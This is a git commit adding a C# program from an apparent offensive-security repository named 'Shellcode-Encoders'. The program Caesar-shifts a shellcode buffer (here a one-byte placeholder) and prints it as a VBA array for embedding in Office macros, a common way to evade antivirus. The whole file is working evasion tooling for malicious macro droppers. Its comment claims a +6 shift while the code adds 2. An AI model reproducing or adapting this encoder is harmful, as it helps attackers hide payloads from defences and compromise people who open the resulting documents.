f1d454e646f5a5edf6dc711756c3a8c8aa1bec37
rootshooter <75587096+rootshooter@users.noreply.github.com>
2022-04-04 11:08:54 -0700

    Add files via upload

---
+++ Shellcode-Encoders/VbaCaesarEncoder/Program.cs
@@ -0,0 +1,48 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace VbaCaesarBufEncrypter
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // insert 32-bit csharp shellcode
+            byte[] buf = new byte[1] { 0x3c };
+
+            // perform caesar shift (+6) and bitwise AND to 0xFF
+            Console.WriteLine("[+] Encrypting shellcode");
+            byte[] crypt = new byte[buf.Length];
+            for (int i = 0; i < buf.Length; i++)
+            {
+                crypt[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+            }
+
+            // initialize a counter
+            uint counter = 0;
+
+            // format the new payload to work with VBA
+            StringBuilder hex = new StringBuilder(crypt.Length * 2);
+            foreach (byte b in crypt)
+            {
+                hex.AppendFormat("{0:D}, ", b);
+                counter++;
+
+                if (counter % 50 == 0)
+                {
+                    hex.AppendFormat($"_{Environment.NewLine}");
+                }
+            }
+
+            // print the encrypted and formatted payload 
+            Console.WriteLine("[+] Here is your new payload:\n");
+            string NewHex = hex.ToString();
+            char[] MyChar = { ',', ' ' };
+            string final = NewHex.TrimEnd(MyChar);
+            Console.WriteLine($"buf = Array({final})");
+        }
+    }
+}
